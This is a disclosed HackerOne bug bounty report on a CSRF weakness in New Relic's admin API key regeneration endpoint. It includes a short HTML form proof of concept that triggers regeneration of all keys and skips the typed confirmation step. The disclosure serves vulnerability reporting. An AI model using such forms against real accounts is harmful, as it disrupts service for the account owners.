ReportLink:https://hackerone.com/reports/119148
WeaknessName:Cross-Site Request Forgery (CSRF)
Reporter:https://hackerone.com/scorppy
ReportedTo:New Relic(newrelic)
BountyAmount:
Severity:
State:Closed
DateOfDisclosure:27.08.2016 12:27:12

Summary:

Hi

The request to regenerate all admin api keys is a GET request without CSRF protection. As such, you can regenerate someone's keys using csrf. While not too big of an issue (the admin can always see the keys and use them) its certainly annoying and can cause business disruption. Additionally, a funny fact is that you have to confirm the regeneration by typing `DELETION IS FOREVER`, but with csrf you can bypass this confirm :P

Here's the poc:
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://rpm.newrelic.com/accounts/[USER_ID_HERE]/admin_api_keys/regenerate_all">
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```

First, go to https://rpm.newrelic.com/accounts/[USER_ID_HERE]/integrations?page=api_keys and create an admin key. Then use the poc to regenerate.